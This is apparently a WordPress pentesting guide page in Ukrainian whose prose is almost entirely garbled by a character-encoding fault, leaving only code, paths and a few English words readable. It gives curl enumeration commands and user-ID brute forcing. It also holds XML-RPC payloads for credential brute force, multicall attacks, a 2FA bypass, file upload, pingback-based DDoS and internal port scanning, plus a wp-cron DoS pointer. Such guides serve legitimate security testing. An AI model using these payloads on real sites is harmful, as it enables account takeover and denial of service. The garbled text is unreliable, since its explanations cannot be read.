# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

- **–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ** —Ñ–∞–π–ª–∏ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –∑–∞ –∞–¥—Ä–µ—Å–æ—é: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **–§–∞–π–ª–∏ —Ç–µ–º –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤ /wp-content/themes/,** —Ç–æ–º—É, —è–∫—â–æ –≤–∏ –∑–º—ñ–Ω–∏—Ç–µ –¥–µ—è–∫—ñ php —Ñ–∞–π–ª–∏ —Ç–µ–º–∏ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE, –≤–∏, –π–º–æ–≤—ñ—Ä–Ω–æ, –±—É–¥–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π —à–ª—è—Ö. –ù–∞–ø—Ä–∏–∫–ª–∞–¥: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **—Ç–µ–º—É twentytwelve**, –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ—Å—Ç—É–ø–∏—Ç–∏—Å—è** –¥–æ —Ñ–∞–π–ª—É **404.php** –∑–∞ –∞–¥—Ä–µ—Å–æ—é: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **–©–µ –æ–¥–∏–Ω –∫–æ—Ä–∏—Å–Ω–∏–π URL –º–æ–∂–µ –±—É—Ç–∏:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- –£ **wp-config.php** –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫–æ—Ä–µ–Ω–µ–≤–∏–π –ø–∞—Ä–æ–ª—å –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.
- –®–ª—è—Ö–∏ –¥–ª—è –≤—Ö–æ–¥—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **–û—Å–Ω–æ–≤–Ω—ñ —Ñ–∞–π–ª–∏ WordPress**

- `index.php`
- `license.txt` –º—ñ—Å—Ç–∏—Ç—å –∫–æ—Ä–∏—Å–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Ç–∞–∫—É —è–∫ –≤–µ—Ä—Å—ñ—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ–≥–æ WordPress.
- `wp-activate.php` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø—Ä–æ—Ü–µ—Å—É –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏ –ø—Ä–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ –Ω–æ–≤–æ–≥–æ —Å–∞–π—Ç—É WordPress.
- –ü–∞–ø–∫–∏ –¥–ª—è –≤—Ö–æ–¥—É (–º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–µ—Ä–µ–π–º–µ–Ω–æ–≤–∞–Ω—ñ –¥–ª—è –ø—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` - —Ü–µ —Ñ–∞–π–ª, —è–∫–∏–π –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î —Ñ—É–Ω–∫—Ü—ñ—é WordPress, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–¥–∞–≤–∞—Ç–∏ –¥–∞–Ω—ñ –∑ HTTP, —â–æ –¥—ñ—î —è–∫ –º–µ—Ö–∞–Ω—ñ–∑–º —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç—É, –∞ XML - —è–∫ –º–µ—Ö–∞–Ω—ñ–∑–º –∫–æ–¥—É–≤–∞–Ω–Ω—è. –¶–µ–π —Ç–∏–ø –∑–≤'—è–∑–∫—É –±—É–≤ –∑–∞–º—ñ–Ω–µ–Ω–∏–π –Ω–∞ [REST API](https://developer.wordpress.org/rest-api/reference) WordPress.
- –ü–∞–ø–∫–∞ `wp-content` —î –æ—Å–Ω–æ–≤–Ω–∏–º –∫–∞—Ç–∞–ª–æ–≥–æ–º, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏.
- `wp-content/uploads/` - —Ü–µ –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤—Å—ñ —Ñ–∞–π–ª–∏, –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É.
- `wp-includes/` - —Ü–µ –∫–∞—Ç–∞–ª–æ–≥, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –æ—Å–Ω–æ–≤–Ω—ñ —Ñ–∞–π–ª–∏, —Ç–∞–∫—ñ —è–∫ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏, —à—Ä–∏—Ñ—Ç–∏, JavaScript —Ñ–∞–π–ª–∏ —Ç–∞ –≤—ñ–¥–∂–µ—Ç–∏.
- `wp-sitemap.xml` –£ –≤–µ—Ä—Å—ñ—è—Ö WordPress 5.5 —ñ –≤–∏—â–µ WordPress –≥–µ–Ω–µ—Ä—É—î XML —Ñ–∞–π–ª –∫–∞—Ä—Ç–∏ —Å–∞–π—Ç—É –∑ —É—Å—ñ–º–∞ –ø—É–±–ª—ñ—á–Ω–∏–º–∏ –ø–æ—Å—Ç–∞–º–∏ —Ç–∞ –ø—É–±–ª—ñ—á–Ω–æ –∑–∞–ø–∏—Ç—É–≤–∞–Ω–∏–º–∏ —Ç–∏–ø–∞–º–∏ –ø–æ—Å—Ç—ñ–≤ —ñ —Ç–∞–∫—Å–æ–Ω–æ–º—ñ—è–º–∏.

**–ü–æ—Å—Ç –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è**

- –§–∞–π–ª `wp-config.php` –º—ñ—Å—Ç–∏—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –Ω–µ–æ–±—Ö—ñ–¥–Ω—É WordPress –¥–ª—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –¥–æ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ç–∞–∫—É —è–∫ —ñ–º'—è –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —Ö–æ—Å—Ç –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—å, –∫–ª—é—á—ñ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ç–∞ —Å–æ–ª—ñ, –∞ —Ç–∞–∫–æ–∂ –ø—Ä–µ—Ñ—ñ–∫—Å —Ç–∞–±–ª–∏—Ü—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö. –¶–µ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó —Ä–µ–∂–∏–º—É DEBUG, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è —É—Å—É–Ω–µ–Ω–Ω—è –Ω–µ–ø–æ–ª–∞–¥–æ–∫.

### –î–æ–∑–≤–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

- **–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä**
- **–†–µ–¥–∞–∫—Ç–æ—Ä**: –ü—É–±–ª—ñ–∫—É—î —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ —Ç–∞ —á—É–∂–∏–º–∏ –ø–æ—Å—Ç–∞–º–∏
- **–ê–≤—Ç–æ—Ä**: –ü—É–±–ª—ñ–∫—É—î —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –ø–æ—Å—Ç–∞–º–∏
- **–°–ø—ñ–≤—Ä–æ–±—ñ—Ç–Ω–∏–∫**: –ü–∏—à–µ —Ç–∞ –∫–µ—Ä—É—î —Å–≤–æ—ó–º–∏ –ø–æ—Å—Ç–∞–º–∏, –∞–ª–µ –Ω–µ –º–æ–∂–µ —ó—Ö –ø—É–±–ª—ñ–∫—É–≤–∞—Ç–∏
- **–ü—ñ–¥–ø–∏—Å–Ω–∏–∫**: –ü–µ—Ä–µ–≥–ª—è–¥–∞—î –ø–æ—Å—Ç–∏ —Ç–∞ —Ä–µ–¥–∞–≥—É—î —Å–≤—ñ–π –ø—Ä–æ—Ñ—ñ–ª—å

## **–ü–∞—Å–∏–≤–Ω–∞ –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è**

### **–û—Ç—Ä–∏–º–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é WordPress**

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –∑–Ω–∞–π—Ç–∏ —Ñ–∞–π–ª–∏ `/license.txt` –∞–±–æ `/readme.html`

–£ **–¥–∂–µ—Ä–µ–ª—å–Ω–æ–º—É –∫–æ–¥—ñ** —Å—Ç–æ—Ä—ñ–Ω–∫–∏ (–ø—Ä–∏–∫–ª–∞–¥ –∑ [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS –ø–æ—Å–∏–ª–∞–Ω–Ω—è —Ñ–∞–π–ª–∏

![](<../../images/image (533).png>)

- JavaScript —Ñ–∞–π–ª–∏

### –û—Ç—Ä–∏–º–∞—Ç–∏ –ø–ª–∞–≥—ñ–Ω–∏
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –û—Ç—Ä–∏–º–∞—Ç–∏ —Ç–µ–º–∏
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### –í–∏—Ç—è–≥ –≤–µ—Ä—Å—ñ–π –∑–∞–≥–∞–ª–æ–º
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## –ê–∫—Ç–∏–≤–Ω–∞ –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è

### –ü–ª–∞–≥—ñ–Ω–∏ —Ç–∞ –¢–µ–º–∏

–í–∏, –Ω–∞–ø–µ–≤–Ω–æ, –Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –≤—Å—ñ –º–æ–∂–ª–∏–≤—ñ –ü–ª–∞–≥—ñ–Ω–∏ —Ç–∞ –¢–µ–º–∏. –©–æ–± –≤–∏—è–≤–∏—Ç–∏ —ó—Ö —É—Å—ñ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ **–∞–∫—Ç–∏–≤–Ω–æ –∑–¥—ñ–π—Å–Ω–∏—Ç–∏ –ë—Ä—É—Ç—Ñ–æ—Ä—Å —Å–ø–∏—Å–∫—É –ü–ª–∞–≥—ñ–Ω—ñ–≤ —Ç–∞ –¢–µ–º** (–Ω–∞ —â–∞—Å—Ç—è, –¥–ª—è –Ω–∞—Å —î –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ –º—ñ—Å—Ç—è—Ç—å —Ü—ñ —Å–ø–∏—Å–∫–∏).

### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ

- **ID –ë—Ä—É—Ç:** –í–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ –¥—ñ–π—Å–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ —Å–∞–π—Ç—É WordPress, –∑–¥—ñ–π—Å–Ω—é—é—á–∏ –ë—Ä—É—Ç—Ñ–æ—Ä—Å ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
–Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ **200** –∞–±–æ **30X**, —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ id —î **–¥—ñ–π—Å–Ω–∏–º**. –Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å **400**, —Ç–æ–¥—ñ id —î **–Ω–µ–¥—ñ–π—Å–Ω–∏–º**.

- **wp-json:** –í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –∑–∞–ø–∏—Ç—É—é—á–∏:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
–Ü–Ω—à–∏–π `/wp-json/` –∫—ñ–Ω—Ü–µ–≤–∏–π –ø—É–Ω–∫—Ç, —è–∫–∏–π –º–æ–∂–µ —Ä–æ–∑–∫—Ä–∏—Ç–∏ –¥–µ—è–∫—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —Ü–µ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ–π –∫—ñ–Ω—Ü–µ–≤–∏–π –ø—É–Ω–∫—Ç –≤—ñ–¥–∫—Ä–∏–≤–∞—î –ª–∏—à–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ –∑—Ä–æ–±–∏–ª–∏ –ø–æ—Å—Ç. **–ë—É–¥—É—Ç—å –Ω–∞–¥–∞–Ω—ñ –ª–∏—à–µ –≤—ñ–¥–æ–º–æ—Å—Ç—ñ –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —É —è–∫–∏—Ö –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∞ —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è**.

–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **/wp-json/wp/v2/pages** –º–æ–∂–µ –≤–∏—Ç—ñ–∫–∞—Ç–∏ IP-–∞–¥—Ä–µ—Å–∏.

- **–ü–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–ª—è –≤—Ö–æ–¥—É**: –ö–æ–ª–∏ –≤–∏ –≤—Ö–æ–¥–∏—Ç–µ –≤ **`/wp-login.php`**, **–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è** —î **—ñ–Ω—à–∏–º**, —è–∫—â–æ –≤–∫–∞–∑–∞–Ω–µ **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ—Å–Ω—É—î —á–∏ –Ω—ñ**.

### XML-RPC

–Ø–∫—â–æ `xml-rpc.php` –∞–∫—Ç–∏–≤–Ω–∏–π, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –±—Ä—É—Ç—Ñ–æ—Ä—Å –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –∑–∞–ø—É—Å–∫—É DoS-–∞—Ç–∞–∫ –Ω–∞ —ñ–Ω—à—ñ —Ä–µ—Å—É—Ä—Å–∏. (–í–∏ –º–æ–∂–µ—Ç–µ –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ü–µ–π –ø—Ä–æ—Ü–µ—Å[ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ](https://github.com/relarizky/wpxploit), –Ω–∞–ø—Ä–∏–∫–ª–∞–¥).

–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –∞–∫—Ç–∏–≤–Ω–∏–π, —Å–ø—Ä–æ–±—É–π—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ _**/xmlrpc.php**_ —ñ –Ω–∞–¥—ñ—à–ª—ñ—Ç—å —Ü–µ–π –∑–∞–ø–∏—Ç:

**–ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**–ë—Ä—É—Ç—Ñ–æ—Ä—Å –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö**

**`wp.getUserBlogs`**, **`wp.getCategories`** –∞–±–æ **`metaWeblog.getUsersBlogs`** - —Ü–µ –¥–µ—è–∫—ñ –∑ –º–µ—Ç–æ–¥—ñ–≤, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å—É –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö. –Ø–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—É–¥—å-—è–∫–∏–π –∑ –Ω–∏—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è _"–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–µ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ –ø–∞—Ä–æ–ª—å"_ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑ –∫–æ–¥–æ–º 200 –ø–æ–≤–∏–Ω–Ω–æ –∑'—è–≤–∏—Ç–∏—Å—è, —è–∫—â–æ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –Ω–µ–¥—ñ–π—Å–Ω—ñ.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª. –£ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑'—è–≤–∏—Ç—å—Å—è —à–ª—è—Ö ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
–¢–∞–∫–æ–∂ —î **—à–≤–∏–¥—à–∏–π —Å–ø–æ—Å—ñ–±** –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å—É –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **`system.multicall`**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –≤ –æ–¥–Ω–æ–º—É –∑–∞–ø–∏—Ç—ñ:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**–û–±—Ö—ñ–¥ 2FA**

–¶–µ–π –º–µ—Ç–æ–¥ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º, –∞ –Ω–µ –¥–ª—è –ª—é–¥–µ–π, —ñ —î —Å—Ç–∞—Ä–∏–º, —Ç–æ–º—É –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î 2FA. –û—Ç–∂–µ, —è–∫—â–æ —É –≤–∞—Å —î –¥—ñ–π—Å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –∞–ª–µ –≥–æ–ª–æ–≤–Ω–∏–π –≤—Ö—ñ–¥ –∑–∞—Ö–∏—â–µ–Ω–∏–π 2FA, **–≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ xmlrpc.php, —â–æ–± —É–≤—ñ–π—Ç–∏ –∑ —Ü–∏–º–∏ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏, –æ–±–º–∏–Ω–∞—é—á–∏ 2FA**. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å—ñ –¥—ñ—ó, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ —á–µ—Ä–µ–∑ –∫–æ–Ω—Å–æ–ª—å, –∞–ª–µ –≤–∏ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ RCE, —è–∫ –ø–æ—è—Å–Ω—é—î Ippsec —É [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS –∞–±–æ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤**

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –º–µ—Ç–æ–¥ _**pingback.ping**_ —É —Å–ø–∏—Å–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ Wordpress –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç –¥–æ –±—É–¥—å-—è–∫–æ–≥–æ —Ö–æ—Å—Ç–∞/–ø–æ—Ä—Ç—É.\
–¶–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏, —â–æ–± –ø–æ–ø—Ä–æ—Å–∏—Ç–∏ **—Ç–∏—Å—è—á—ñ** —Å–∞–π—Ç—ñ–≤ **Wordpress** **–¥–æ—Å—Ç—É–ø–∏—Ç–∏—Å—è** –¥–æ –æ–¥–Ω–æ–≥–æ **–º—ñ—Å—Ü—è** (—Ç–∞–∫ —â–æ –≤ —Ü—å–æ–º—É –º—ñ—Å—Ü—ñ –≤–∏–∫–ª–∏–∫–∞–Ω–æ **DDoS**) –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **Wordpress** **—Å–∫–∞–Ω—É–≤–∞—Ç–∏** —è–∫—É—Å—å –≤–Ω—É—Ç—Ä—ñ—à–Ω—é **–º–µ—Ä–µ–∂—É** (–≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –ø–æ—Ä—Ç).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ **faultCode** –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º **–±—ñ–ª—å—à–µ** –Ω—ñ–∂ **0** (17), —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –ø–æ—Ä—Ç –≤—ñ–¥–∫—Ä–∏—Ç–∏–π.

–ü–æ–¥–∏–≤—ñ—Ç—å—Å—è –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`system.multicall`** –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –º–µ—Ç–æ–¥–æ–º –¥–ª—è –≤–∏–∫–ª–∏–∫—É DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

–¶–µ–π —Ñ–∞–π–ª –∑–∞–∑–≤–∏—á–∞–π —ñ—Å–Ω—É—î –≤ –∫–æ—Ä–µ–Ω—ñ —Å–∞–π—Ç—É Wordpress: **`/wp-cron.php`**\
–ö–æ–ª–∏ —Ü–µ–π —Ñ–∞–π–ª **–¥–æ—Å—Ç—É–ø–Ω–∏–π**, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è "**–≤–∞–∂–∫–∏–π**" MySQL **–∑–∞–ø–∏—Ç**, —Ç–æ–º—É –π–æ–≥–æ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏** –¥–ª—è **–≤–∏–∫–ª–∏–∫—É** **DoS**.\
